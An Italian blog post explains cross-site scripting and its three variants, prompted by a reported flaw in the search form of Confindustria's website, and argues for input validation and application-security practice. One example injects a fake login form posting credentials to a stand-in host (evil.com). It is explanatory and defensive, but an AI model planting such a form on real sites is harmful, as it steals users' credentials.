---
layout: post
title: "I cross site scripting. Non sono tornati, sono sempre stati qui"
modified:
category: [Chiacchiere da bar]
tags: [xss, validare l'input, sanitizzare l'input, filtro, caratteri illegati, confindustria, ibm, media company, asap, vulnerabilità]
image:
  feature: conf-xss.png
  credit: Matteo Flora
  creditlink: http://mgpf.it/2014/09/19/sito-confindustria-colabrodo.html
comments: true
share: true
---

Qualche giorno fa ero alla stazione di Roma Tiburtina in attesa del treno che
avrebbe chiuso una due giorni di _security awareness_. Tra le altre cose ho
parlato anche di [cross site scripting](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\)), spiegando come sia una
vulnerabilità ormai in giro da un bel po' di tempo.

Leggevo su [Il sole 24
ore](http://www.ilsole24ore.com/art/tecnologie/2014-09-17/confindustria-rinnova-sito-diventa-social-network-le-imprese-141632.shtml?uuid=ABU5ScuB)
che era online il nuovo sito di [confindustria](http://www.confindustria.it),
nato da una partnership con [IBM](http://www.ibm.com) e da una media company
che ne ha curato il layout grafico.

Se si è scomodata _big blue_ appare chiaro che il progetto deve essere stato
bello grosso. IBM, è utile ricordarlo, è quella che nel suo portafoglio vanta
un prodotto commerciale di [application security](http://www-03.ibm.com/software/products/en/appscan) a tutto
tondo, quell'AppScan croce e delizia di chi l'ha visto all'opera[^1].

Bene, il sito istituzione di [confindustria](http://www.confindustria.it)
soffre di un banalissimo cross site scripting[^2] nella form di ricerca, come
ci mostra [@LK](http://mgpf.it/2014/09/19/sito-confindustria-colabrodo.html) al quale va anche il credit per l'immagine
usata per questo post.

## Che cos'è il cross site scripting?

Giuro, ero indeciso se dedicare un intero post alla descrizione di cosa sia un
cross site scripting e di come mitigarlo. Evidentemente sbagliavo nel pensare
che l'awareness su temi _veramente base_ della sicurezza applicativa si fosse
diffuso, almeno ad un certo livello.

> Quando un'applicazione web prende un input proveniente dall'esterno e lo usa
> **così com'è** nell'HTML che verrà inviato al browser allora è vulnerabile ad
> un cross site scripting.

Cosa significa essere vulnerabile? Significa che un attaccante può passare
all'applicazione dei pezzi di codice javascript che verranno inseriti nel
sorgente della pagina che sarà inviata al browser.

Ricevendo quell'HTML modificato, il browser della vittima eseguirà il codice
arbitrario inserito dall'attaccante.

Quindi, se io volessi aggiungere una maschera di login ad un sito vulnerabile,
potrei iniettare nel codice della pagina qualcosa come:

{%highlight html%}
<form action="http://www.evil.com/evil.do">
  <input name="login" placeholder="login" type="text" />
  <input name="password" placeholder="login" type="password" />
</form>
{%endhighlight %}

> Il cross site scripting è una vulnerabilità lato server perché è introdotta
> da un uso insicuro dell'input utente da parte di un'applicazione web,
> tuttavia viene sfruttata lato client ovvero è il browser della vittima ad
> eseguire il codice arbitrario.

L'applicazione vulnerabile prenderebbe il codice di questa form e lo metterebbe
nell'html da inviare al browser. In questo modo ci sarebbe una form che
nell'html originale pensato dallo sviluppatore non era presente. Per l'utente
(vittima), questa form non è altro che parte integrante della pagina che sta
visualizzando. La vittima dell'attacco è portata a credere che il contenuto che
vuole visualizzare è accessibile previa autenticazione. Autenticazione, falsa,
che verrebbe effettuata verso il sito sotto il controllo dell'attaccante.

Il cross site scripting è una vulnerabilità che si presenta in 3 varianti
distinte:

* reflected
* stored
* DOM based

Un XSS è _reflected_ se il valore del parametro vulnerabile viene utilizzato
immediatamente dall'applicazione per generare una pagina successiva. La
differenza con un XSS _stored_ è appunto che quest'ultimo salva il valore del
parametro vulnerabile, che contiene il codice js arbitrario inserito
dall'attaccante, in un database (ad esempio, ma potrebbe essere anche un file
di testo letto successivamente). Un XSS di tipo _stored_ quindi non viene
sfruttato immediatamente dall'attaccante, ma resta lì silente fino a quando
quel dato non viene recuperato da db e utilizzato dall'applicazione.

Potenzialmente un cross site scripting di tipo stored può impattare molti più
utenti nel momento in cui l'accesso a quel dato è pubblico ad esempio.

Un XSS è di tipo _DOM based_ quando il pattern d'attacco viene passato nell'url
dopo il carattere #. Solitamente nelle UI evolute c'è molto codice javascript
dedicato alla costruzione dell'interfaccia e al popolamento della stessa con
dati che non serve vengano inviati al server. Se il javascript gestisce quello
passato dopo il # in maniera non sicura, abbiamo che è possibile iniettare
codice arbirtario direttamente nel DOM della pagina quando il browser cerca di
utilizzare questi dati per costruire, ad esempio, la UI del sito.

La differenza importante, in questo caso, è che il codice d'attacco non viene
mandato al server ma viene preso dal browser ed accodato al DOM non appena il
server restituisce la pagina in risposta. Avendo spostato il codice web lato
client è chiaro che anche le issue di security si spostano anche lato client.

Negli altri due casi possiamo dire che il cross site scripting è una
vulnerabilità lato server perché è introdotta da un uso insicuro dell'input
utente da parte di un'applicazione web, tuttavia viene sfruttata lato client
ovvero è il browser della vittima ad eseguire il codice arbitrario.

## Storie di ordinaria banfa

Gestire l'input in maniera opportuna non è fantascenza da Web 2.0. Vi ricordate
gli anni '90? Vi ricordate quando si parlava di buffer overflow? Ecco, se vi
ricordate cos'è un buffer overflow, dovreste ricordare come il problema fosse
nel mancato controllo della lunghezza di un dato in input nel momento della
copia in un array.

Sono passati una trentina d'anni e ci ostiniamo a non fare alcun controllo
quando un utente ci da un input. Alcune issue di security gravi, come il XSS o
le SQL Injection, potrebbero essere mitigate in maniera **banale**
dall'applicazione di una regular expression o di qualche if che rispedisca al
mittente un input quando non è quello che ci attendevamo.

Se stiamo leggendo un codice fiscale, ad esempio, sappiamo molto bene quando un
input è lecito e quando no (anche senza entrare nel dettaglio se il valore
passato è un codice fiscale corretto semanticamente).

Se stiamo leggendo un cognome probabilmente avremmo costruito quel campo con
una lunghezza fissa, quindi perché permettere che l'utente inserisca la divina
commedia?

Certo, ci hanno insegnato che i linguaggi dinamici hanno una gestione
_migliore_ della memoria e quindi non dobbiamo preoccuparci di overflow in
quanto è la virtual machine sottostante a gestire le reallocazioni e le free
della memoria non più indirizzata.

Corretto. Questo, tuttavia, **non** vuol dire scrivere codice che non si
preoccupi di fare dei controlli sui valori dell'input calati nel contesto della
vostra applicazione.

Al netto che porre rimedio a XSS e SQL Injection è un fatto di scrivere codice
di un livello di qualità decente, questa storia mette a nudo ahimé una mancanza
di awareness che interessa livelli molto in alto dell'IT italiano, laddove la
qualità dovrebbe essere un must.

In confindustria non c'è un settore IT Security. Questo ci può stare, dopotutto
è un'associazione che, seppur importante per l'imprenditoria italiana, non si
occupa direttamente di software / web.

IBM, che ha gestito la commessa con una web agency per la parte di _figosità
del sito_, non ha saputo dare supporto su temi di IT Security. E questo mi
lascia perplesso.

Mi lascia perplesso che il loro application server, _websphere_, non venga
installato seguendo best practices che vogliono anche l'installazione di un web
application firewall. Esiste [mod_security](http://www.modsecurity.org) che è
opensource e con l'[Owasp Core
Ruleset](https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project)
introduce un buon livello di protezione. Se non avete idea di come si installi,
ne ho scritto dopo tempo fa in [questo
post](https://codiceinsicuro.it/blog/lasap-parte-da-solide-fondamenta-ed-una-lucente-armatura/).

Mi lascia perplesso che loro, che sono vendor di tool di application security,
non abbiano come prassi consolidata quella di eseguire un penetration test
applicativo prima della messa in esercizio di un sito, soprattutto se
istituzionalmente importante come quello di confindustria.
Hanno il software per eseguire i test, hanno il know-how (forse) perché vendono
servizi professionali di security non credo abbiano problemi nell'annegare
qualche K di attività in un progetto che di sicuro sarà costato qualche
soldino.

Di sicuro ci sono strutture mastodontiche dentro IBM che non si parlano, ma...
se io sono uno sviluppatore o un manager di IBM, davvero non so quello che fa o
vende la mia azienda in campo IT Security?

## Off by one

> Difficilmente compreresti una casa senza porta blindata? Probabilmente no, ci
> sono i ladri e sono interessati potenzialmente ai tuoi averi anche se non sei
> un milionario.

Di sicuro c'è poca sensibilità in giro sui temi di sicurezza applicativa.
L'attacco informatico viene visto come qualcosa che accade nei film e che
interessa solo le banche. Se l'IT rappresenta un puro costo aziendale, e
nell'era avanzata della net economy questo fa solo capire quanto anche il
decision maker italiano medio sia **miope**, l'IT security è vista come un
costo superfluo dentro l'IT.

Tuttavia, difficilmente compreresti una casa senza porta blindata?
Probabilmente no, ci sono i ladri e sono interessati potenzialmente ai tuoi
averi anche se non sei un milionario. Quindi la porta blindata è in realtà un
investimento necessario.

Che poi, vengono attaccate le banche, parliamone... basta guardare questo
[report del ITRC sui data breach avvenuti nei primi mesi del
2014](http://www.idtheftcenter.org/images/breach/ITRCBreachStatsReportSummary2014.pdf)
per accorgersi che è un luogo comune tanto falso quanto duro a morire. Nel 2014
solo il 4,3% dei data breach negli Stati Uniti hanno interessato il settore
bancario e finanziario.

A questo punto perché non lo è l'avvio di un programma aziendale di application
security? Si perché se ci limitassimo a fare un penetration test ogni tanto,
anche se sarebbe già qualcosa, butteremmo via soldi e tempo.

La security non è un tool, è un processo. Questo mantra lo sentite in ogni talk
che si rispetti. Evitare disastri come quello del sito di confindustria quindi
non è solo grazie all'esecuzione di un penetration test spot. Disastri del
genere, e cose ben peggiori, si evitano con un team preparato di application
security che sensibilizzi utenti finali e sviluppatori. Si evitano con linee
guida di sviluppo sicuro e test di security sia rivolti al codice sorgente che
penetration test tradizionali e ripetuti nel tempo.

Si evitano anche ingaggiando società terze che non la buttano solo sul blasone,
ma che ci mettono anche del contenuto.

[^1]: e di chi l'ha potuto usare in passato quando sotto il marchio Watchfire
      era veramente un tool che spaccava.

[^2]: a questo punto possiamo abbreviare cross site scripting con XSS, ormai
      siamo in confidenza.
